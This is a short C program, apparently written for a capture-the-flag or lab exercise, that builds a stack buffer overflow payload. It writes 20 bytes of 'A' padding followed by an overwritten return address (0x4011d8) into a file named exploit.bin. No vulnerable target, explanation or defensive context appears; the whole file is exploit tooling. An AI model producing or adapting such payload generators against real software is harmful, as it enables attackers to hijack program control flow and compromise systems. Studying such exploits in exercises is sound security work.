#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
    FILE *f = fopen("exploit.bin", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    char padding[20];
    memset(padding, 'A', sizeof(padding));

    unsigned long long ret_addr = 0x4011d8;
    
    fwrite(padding, 1, sizeof(padding), f);
    fwrite(&ret_addr, 1, sizeof(ret_addr), f);

    fclose(f);
    return 0;
}